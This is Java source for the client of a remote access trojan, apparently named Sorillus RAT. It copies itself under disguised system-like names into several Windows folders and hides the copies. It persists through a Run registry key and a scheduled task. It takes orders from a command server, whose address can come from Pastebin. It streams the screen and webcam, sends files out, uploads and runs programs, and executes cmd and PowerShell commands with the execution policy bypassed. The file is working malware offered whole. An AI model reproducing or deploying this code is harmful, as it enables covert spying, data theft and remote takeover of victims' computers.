package com.sorillus.rat;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.util.List;
import java.util.Random;
import java.util.UUID;

public class Client {
    private static float quality = 0.5f;
    private static int fps = 5;
    private static final long RECONNECT_DELAY = 5000;
    private static final boolean COPY_TO_FOLDER = false; // Set by BuilderWindow
    private static final String COPY_PATH = "%TEMP%"; // Set by BuilderWindow
    private static final String CLIENT_ID = UUID.randomUUID().toString();
    private static volatile boolean running = true;
    private static Webcam webcam;
    private static Socket screenshotSocket;
    private static Socket webcamSocket;
    private static Socket commandSocket;
    private static final String[] NAME_PART1 = {
            "Win", "System", "Browser", "Service", "Task", "Core", "Update", "Ms", "Nt", "Svc"
    };
    private static final String[] NAME_PART2 = {
            "Host", "Update", "Core", "Manager", "Service", "Log", "Config", "Proc", "Sys", "Agent"
    };
    private static final Random RANDOM = new Random();

    public static void main(String[] args) {
        if (COPY_TO_FOLDER) {
            try {
                String currentPath = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
                File currentFile = new File(currentPath);

                String resolvedPath = resolvePath(COPY_PATH);
                if (!currentPath.startsWith(resolvedPath)) {
                    String[] targetPaths = {
                            System.getenv("APPDATA") + "\\Microsoft\\Windows",
                            System.getenv("PROGRAMDATA"),
                            System.getenv("TEMP"),
                            System.getProperty("user.home") + "\\AppData\\Local"
                    };

                    String baseName = generateSystemLikeName();
                    String jarName = baseName + ".jar";

                    for (String target : targetPaths) {
                        File destDir = new File(target);
                        if (!destDir.exists()) {
                            destDir.mkdirs();
                        }
                        File destFile = new File(destDir, jarName);
                        Files.copy(currentFile.toPath(), destFile.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                        setFileAttributes(destFile);
                    }

                    addToRegistry(baseName, resolvedPath + "\\" + jarName);
                    addToTaskScheduler(baseName, resolvedPath + "\\" + jarName);

                    new ProcessBuilder("cmd.exe", "/c", "start /B javaw -jar \"" + resolvedPath + "\\" + jarName + "\"").start();
                    System.exit(0);
                }
            } catch (Exception e) {
                System.err.println("Error during persistence setup: " + e.getMessage());
                e.printStackTrace();
            }
        }

        while (true) {
            try {
            String serverIP = "127.0.0.1"; // Local IP for testing
            int port = 1604;
                System.out.println("Starting client... Client ID: " + CLIENT_ID);

            String pastebinUrl = ""; // Will be replaced by BuilderWindow
                if (!pastebinUrl.isEmpty()) {
                    String[] serverDetails = getServerDetailsFromPastebin(pastebinUrl);
                    serverIP = serverDetails[0];
                    port = Integer.parseInt(serverDetails[1]);
                }

                System.out.println("Attempting to connect to server at " + serverIP + ":" + port);
                commandSocket = new Socket();
                commandSocket.connect(new InetSocketAddress(serverIP, port), 5000);
                screenshotSocket = new Socket();
                screenshotSocket.connect(new InetSocketAddress(serverIP, port), 5000);
                webcamSocket = new Socket();
                webcamSocket.connect(new InetSocketAddress(serverIP, port), 5000);

                DataOutputStream commandOutput = new DataOutputStream(commandSocket.getOutputStream());
                commandOutput.writeUTF("CLIENT_ID:" + CLIENT_ID);
                commandOutput.flush();
                System.out.println("Sent client ID to server: " + CLIENT_ID);

                BufferedReader commandReader = new BufferedReader(new InputStreamReader(commandSocket.getInputStream()));

                new Thread(() -> {
                    try {
                        String command;
                        Robot robot = new Robot();
                        while (running && (command = commandReader.readLine()) != null) {
                            System.out.println("Received command: " + command);
                            if (command.startsWith("QUALITY:")) {
                                quality = Float.parseFloat(command.split(":")[1]);
                                System.out.println("Updated quality to: " + quality);
                            } else if (command.startsWith("FPS:")) {
                                fps = Integer.parseInt(command.split(":")[1]);
                                System.out.println("Updated FPS to: " + fps);
                            } else if (command.equals("LIST_WEBCAMS")) {
                                listWebcams(commandOutput);
                            } else if (command.equals("WEBCAM_START")) {
                                startWebcamStream(commandOutput, webcamSocket.getOutputStream());
                            } else if (command.equals("WEBCAM_STOP")) {
                                stopWebcamStream();
                            } else if (command.startsWith("FILE_REQUEST:")) {
                                String filePath = command.split(":")[1];
                                sendFile(filePath, commandSocket.getOutputStream());
                            } else if (command.startsWith("LIST_FILES:")) {
                                String path = command.split(":")[1];
                                listFiles(path, commandOutput);
                            } else if (command.startsWith("LIST_DRIVES")) {
                                listDrives(commandOutput);
                            } else if (command.startsWith("DOWNLOAD:")) {
                                String filePath = command.split(":")[1];
                                sendFile(filePath, commandSocket.getOutputStream());
                            } else if (command.startsWith("UPLOAD:")) {
                                String[] parts = command.split(":");
                                String filePath = parts[1];
                                long fileSize = Long.parseLong(parts[2]);
                                receiveFile(filePath, fileSize, commandSocket.getInputStream(), commandOutput);
                            } else if (command.startsWith("EXECUTE:")) {
                                String filePath = command.split(":")[1];
                                executeFile(filePath, commandOutput);
                            } else if (command.startsWith("MOUSE_CLICK:")) {
                                String[] parts = command.split(":");
                                int x = Integer.parseInt(parts[1]);
                                int y = Integer.parseInt(parts[2]);
                                robot.mouseMove(x, y);
                                robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
                                robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
                                System.out.println("Performed mouse click at: " + x + ", " + y);
                            } else if (command.equals("GET_SCREEN_SIZE")) {
                                Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
                                commandOutput.writeUTF("SCREEN_SIZE:" + screenSize.width + ":" + screenSize.height);
                                commandOutput.flush();
                                System.out.println("Sent screen size to server: " + screenSize.width + "x" + screenSize.height);
                            } else if (command.startsWith("CMD_EXECUTE:")) {
                                String cmdCommand = command.substring(12);
                                executeCmdCommand(cmdCommand, commandOutput);
                            } else if (command.startsWith("POWERSHELL_EXECUTE:")) {
                                String psCommand = command.substring(19);
                                executePowerShellCommand(psCommand, commandOutput);
                            } else if (command.equals("LIST_PROCESSES")) {
                                listProcesses(commandOutput);
                            } else if (command.startsWith("KILL_PROCESS:")) {
                                String pid = command.split(":")[1];
                                killProcess(pid, commandOutput);
                            }
                        }
                    } catch (IOException e) {
                        System.err.println("Error in command thread: " + e.getMessage());
                    } catch (AWTException e) {
                        System.err.println("Error initializing Robot for mouse control: " + e.getMessage());
                    }
                }).start();

                new Thread(() -> {
                    try {
                        Robot robot = new Robot();
                        DataOutputStream screenshotOutput = new DataOutputStream(screenshotSocket.getOutputStream());
                        while (running) {
                            System.out.println("Capturing screenshot...");
                            BufferedImage screenshot = robot.createScreenCapture(
                                    new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())
                            );
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            ImageIO.write(screenshot, "jpg", baos);
                            byte[] imageBytes = baos.toByteArray();
                            System.out.println("Sending screenshot of size: " + imageBytes.length + " bytes");

                            screenshotOutput.writeInt(imageBytes.length);
                            screenshotOutput.flush();
                            screenshotOutput.write(imageBytes);
                            screenshotOutput.flush();

                            Thread.sleep(1000 / fps);
                        }
                    } catch (Exception e) {
                        System.err.println("Error in screenshot thread: " + e.getMessage());
                    }
                }).start();

                while (running) {
                    Thread.sleep(1000);
                }
            } catch (Exception e) {
                System.err.println("Client error: " + e.getMessage());
                try {
                    Thread.sleep(RECONNECT_DELAY);
                } catch (InterruptedException ie) {
                    ie.printStackTrace();
                }
            } finally {
                try {
                    if (commandSocket != null) commandSocket.close();
                    if (screenshotSocket != null) screenshotSocket.close();
                    if (webcamSocket != null) webcamSocket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private static String generateSystemLikeName() {
        String part1 = NAME_PART1[RANDOM.nextInt(NAME_PART1.length)];
        String part2 = NAME_PART2[RANDOM.nextInt(NAME_PART2.length)];
        String suffix = "";
        if (RANDOM.nextBoolean()) {
            int suffixType = RANDOM.nextInt(3);
            switch (suffixType) {
                case 0:
                    suffix = "_svc";
                    break;
                case 1:
                    suffix = "_x" + generateRandomString(3);
                    break;
                case 2:
                    suffix = "_v" + generateRandomNumber(3);
                    break;
            }
        }
        return part1 + part2 + suffix;
    }

    private static String generateRandomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(RANDOM.nextInt(chars.length())));
        }
        return sb.toString();
    }

    private static String generateRandomNumber(int length) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(RANDOM.nextInt(10));
        }
        return sb.toString();
    }

    private static void setFileAttributes(File file) throws IOException {
        Files.setAttribute(file.toPath(), "dos:hidden", true);
        Files.setAttribute(file.toPath(), "dos:system", true);
    }

    private static void addToRegistry(String taskName, String jarPath) throws IOException {
        String regCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + taskName + " /t REG_SZ /d \"javaw -jar \\\"" + jarPath + "\\\"\" /f";
        new ProcessBuilder("cmd.exe", "/c", regCommand).start();
    }

    private static void addToTaskScheduler(String taskName, String jarPath) throws IOException {
        String schtasksCommand = "schtasks /create /sc ONLOGON /tn " + taskName + " /tr \"javaw -jar \\\"" + jarPath + "\\\"\" /rl HIGHEST /f";
        new ProcessBuilder("cmd.exe", "/c", schtasksCommand).start();
    }

    private static void executeCmdCommand(String command, DataOutputStream output) {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            StringBuilder result = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    result.append(line).append("\n");
                }
            }
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                output.writeUTF("CMD_RESULT:" + result.toString());
            } else {
                output.writeUTF("CMD_ERROR:Command failed with exit code " + exitCode + "\n" + result.toString());
            }
            output.flush();
            System.out.println("Executed CMD command: " + command + ", Exit code: " + exitCode);
        } catch (IOException | InterruptedException e) {
            try {
                output.writeUTF("CMD_ERROR:Exception occurred: " + e.getMessage());
                output.flush();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            System.err.println("Error executing CMD command: " + e.getMessage());
        }
    }

    private static void executePowerShellCommand(String command, DataOutputStream output) {
        try {
            ProcessBuilder pb = new ProcessBuilder("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            StringBuilder result = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    result.append(line).append("\n");
                }
            }
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                output.writeUTF("POWERSHELL_RESULT:" + result.toString());
            } else {
                output.writeUTF("POWERSHELL_ERROR:Command failed with exit code " + exitCode + "\n" + result.toString());
            }
            output.flush();
            System.out.println("Executed PowerShell command: " + command + ", Exit code: " + exitCode);
        } catch (IOException | InterruptedException e) {
            try {
                output.writeUTF("POWERSHELL_ERROR:Exception occurred: " + e.getMessage());
                output.flush();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            System.err.println("Error executing PowerShell command: " + e.getMessage());
        }
    }

    private static void listProcesses(DataOutputStream output) {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "tasklist /v /fo csv");
            pb.redirectErrorStream(true);
            Process process = pb.start();
            StringBuilder result = new StringBuilder("PROCESS_LIST:");
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"))) {
                String line;
                boolean firstLine = true;
                while ((line = reader.readLine()) != null) {
                    if (firstLine) {
                        firstLine = false;
                        continue; // Skip header
                    }
                    // Split CSV line, handle quoted fields
                    String[] parts = line.split(",(?=([^\"]*\"[^\"]*\")*[^\"]*$)");
                    if (parts.length >= 2) {
                        String processName = parts[0].replace("\"", "");
                        String pid = parts[1].replace("\"", "");
                        result.append(processName).append("|").append(pid).append(";");
                    }
                }
            }
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                output.writeUTF(result.toString());
            } else {
                output.writeUTF("PROCESS_ERROR:Command failed with exit code " + exitCode);
            }
            output.flush();
            System.out.println("Listed processes, Exit code: " + exitCode);
        } catch (IOException | InterruptedException e) {
            try {
                output.writeUTF("PROCESS_ERROR:Exception occurred: " + e.getMessage());
                output.flush();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            System.err.println("Error listing processes: " + e.getMessage());
        }
    }

    private static void killProcess(String pid, DataOutputStream output) {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "taskkill /PID " + pid + " /F");
            pb.redirectErrorStream(true);
            Process process = pb.start();
            StringBuilder result = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    result.append(line).append("\n");
                }
            }
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                output.writeUTF("KILL_SUCCESS:Process " + pid + " terminated");
            } else {
                output.writeUTF("KILL_ERROR:Failed to terminate process " + pid + "\n" + result.toString());
            }
            output.flush();
            System.out.println("Attempted to kill process " + pid + ", Exit code: " + exitCode);
        } catch (IOException | InterruptedException e) {
            try {
                output.writeUTF("KILL_ERROR:Exception occurred: " + e.getMessage());
                output.flush();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
            System.err.println("Error killing process " + pid + ": " + e.getMessage());
        }
    }

    private static void listWebcams(DataOutputStream dataOutputStream) throws IOException {
        System.out.println("Listing webcams...");
        try {
            List<Webcam> webcams = Webcam.getWebcams(5000);
            System.out.println("Found " + webcams.size() + " webcams.");
            if (webcams.isEmpty()) {
                System.out.println("No webcams detected!");
                dataOutputStream.writeUTF("WEBCAM_LIST:NONE");
            } else {
                System.out.println("Webcams detected: ");
                for (int i = 0; i < webcams.size(); i++) {
                    System.out.println(" - Webcam " + i + ": " + webcams.get(i).getName());
                }
                dataOutputStream.writeUTF("WEBCAM_LIST:AVAILABLE");
            }
            dataOutputStream.flush();
        } catch (Exception e) {
            System.err.println("Error listing webcams: " + e.getMessage());
            e.printStackTrace();
            dataOutputStream.writeUTF("WEBCAM_LIST:ERROR:" + e.getMessage());
            dataOutputStream.flush();
        }
    }

    private static void startWebcamStream(DataOutputStream commandOutput, OutputStream outputStream) {
        new Thread(() -> {
            try {
                System.out.println("Starting webcam stream...");
                List<Webcam> webcams = Webcam.getWebcams(5000);
                if (webcams.isEmpty()) {
                    System.err.println("No webcams available.");
                    commandOutput.writeUTF("WEBCAM_ERROR:No webcams found");
                    commandOutput.flush();
                    return;
                }

                webcam = webcams.get(0);
                System.out.println("Selected webcam: " + webcam.getName());
                webcam.setViewSize(WebcamResolution.VGA.getSize());
                webcam.open();
                System.out.println("Webcam opened: " + webcam.getName());

                DataOutputStream dos = new DataOutputStream(outputStream);
                int nullImageCount = 0;
                while (running && webcam.isOpen()) {
                    BufferedImage image = webcam.getImage();
                    if (image == null) {
                        nullImageCount++;
                        System.err.println("Webcam returned null image! (Count: " + nullImageCount + ")");
                        if (nullImageCount > 10) {
                            System.err.println("Webcam failed to provide images consistently. Stopping stream.");
                            commandOutput.writeUTF("WEBCAM_ERROR:Failed to capture images");
                            commandOutput.flush();
                            break;
                        }
                        Thread.sleep(100);
                        continue;
                    }
                    nullImageCount = 0;

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ImageIO.write(image, "jpg", baos);
                    byte[] imageBytes = baos.toByteArray();
                    System.out.println("Sending webcam frame of size: " + imageBytes.length + " bytes");

                    synchronized (dos) {
                        dos.writeInt(imageBytes.length);
                        dos.flush();
                        outputStream.write(imageBytes);
                        outputStream.flush();
                    }

                    Thread.sleep(1000 / fps);
                }
            } catch (Exception e) {
                System.err.println("Error in webcam stream: " + e.getMessage());
                e.printStackTrace();
                try {
                    commandOutput.writeUTF("WEBCAM_ERROR:" + e.getMessage());
                    commandOutput.flush();
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            } finally {
                if (webcam != null && webcam.isOpen()) {
                    webcam.close();
                    System.out.println("Webcam closed: " + webcam.getName());
                }
            }
        }).start();
    }

    private static void stopWebcamStream() {
        if (webcam != null && webcam.isOpen()) {
            System.out.println("Stopping webcam stream...");
            webcam.close();
            System.out.println("Webcam stopped.");
        }
    }

    private static String resolvePath(String path) {
        if (path.equals("%TEMP%")) {
            return System.getenv("TEMP");
        } else if (path.equals("%APPDATA%")) {
            return System.getenv("APPDATA");
        } else if (path.equals("%PROGRAMDATA%")) {
            return System.getenv("PROGRAMDATA");
        } else if (path.equals("%USERPROFILE%")) {
            return System.getProperty("user.home");
        }
        return path;
    }

    private static String[] getServerDetailsFromPastebin(String pastebinUrl) {
        try {
            URL url = new URL(pastebinUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) {
                content.append(line);
            }
            in.close();

            String result = content.toString().trim();
            if (result.contains(":")) {
                return result.split(":");
            } else {
                return new String[]{result, "1604"};
            }
        } catch (Exception e) {
            System.err.println("Error fetching Pastebin: " + e.getMessage());
            return new String[]{"127.0.0.1", "1604"};
        }
    }

    private static void sendFile(String filePath, OutputStream outputStream) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
                dataOutputStream.writeUTF("ERROR:File not found: " + filePath);
                dataOutputStream.flush();
                return;
            }

            DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
            dataOutputStream.writeUTF("FILE_SIZE:" + file.length());
            dataOutputStream.writeUTF("FILE_NAME:" + file.getName());

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
            fis.close();
            outputStream.flush();
        } catch (IOException e) {
            System.err.println("Error sending file: " + e.getMessage());
        }
    }

    private static void listFiles(String path, DataOutputStream dataOutputStream) {
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                dataOutputStream.writeUTF("ERROR:Directory not found: " + path);
                dataOutputStream.flush();
                return;
            }

            File[] files = dir.listFiles();
            if (files == null) {
                dataOutputStream.writeUTF("FILE_LIST:[]");
                dataOutputStream.flush();
                return;
            }

            StringBuilder fileList = new StringBuilder("FILE_LIST:");
            for (File file : files) {
                fileList.append(file.getName()).append("|")
                        .append(file.isDirectory() ? "DIR" : "FILE").append("|")
                        .append(file.length()).append(";");
            }
            dataOutputStream.writeUTF(fileList.toString());
            dataOutputStream.flush();
        } catch (IOException e) {
            System.err.println("Error listing files: " + e.getMessage());
        }
    }

    private static void listDrives(DataOutputStream dataOutputStream) {
        try {
            File[] roots = File.listRoots();
            StringBuilder driveList = new StringBuilder("DRIVE_LIST:");
            for (File root : roots) {
                String drivePath = root.getAbsolutePath();
                if (drivePath.endsWith("\\")) {
                    drivePath = drivePath.substring(0, drivePath.length() - 1);
                }
                driveList.append(drivePath).append(";");
            }
            dataOutputStream.writeUTF(driveList.toString());
            dataOutputStream.flush();
        } catch (IOException e) {
            System.err.println("Error listing drives: " + e.getMessage());
        }
    }

    private static void receiveFile(String filePath, long fileSize, InputStream inputStream, DataOutputStream dataOutputStream) {
        try {
            String resolvedPath = resolvePath(filePath);
            File file = new File(resolvedPath);
            if (file.exists()) {
                file.delete();
            }

            FileOutputStream fos = new FileOutputStream(file);
            byte[] buffer = new byte[1024];
            long bytesRead = 0;
            int count;
            while (bytesRead < fileSize && (count = inputStream.read(buffer, 0, (int) Math.min(buffer.length, fileSize - bytesRead))) != -1) {
                fos.write(buffer, 0, count);
                bytesRead += count;
            }
            fos.close();

            dataOutputStream.writeUTF("UPLOAD_SUCCESS:" + resolvedPath);
            dataOutputStream.flush();
            System.out.println("File received and saved to: " + resolvedPath);
        } catch (IOException e) {
            System.err.println("Error receiving file: " + e.getMessage());
            try {
                dataOutputStream.writeUTF("ERROR:Failed to upload file: " + e.getMessage());
                dataOutputStream.flush();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    private static void executeFile(String filePath, DataOutputStream dataOutputStream) {
        try {
            String resolvedPath = resolvePath(filePath);
            File file = new File(resolvedPath);
            if (!file.exists()) {
                dataOutputStream.writeUTF("ERROR:File not found: " + resolvedPath);
                dataOutputStream.flush();
                return;
            }

            new ProcessBuilder("java", "-jar", resolvedPath).start();
            dataOutputStream.writeUTF("EXECUTE_SUCCESS:" + resolvedPath);
            dataOutputStream.flush();
            System.out.println("Executed file: " + resolvedPath);
        } catch (IOException e) {
            System.err.println("Error executing file: " + e.getMessage());
            try {
                dataOutputStream.writeUTF("ERROR:Failed to execute file: " + e.getMessage());
                dataOutputStream.flush();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }
}
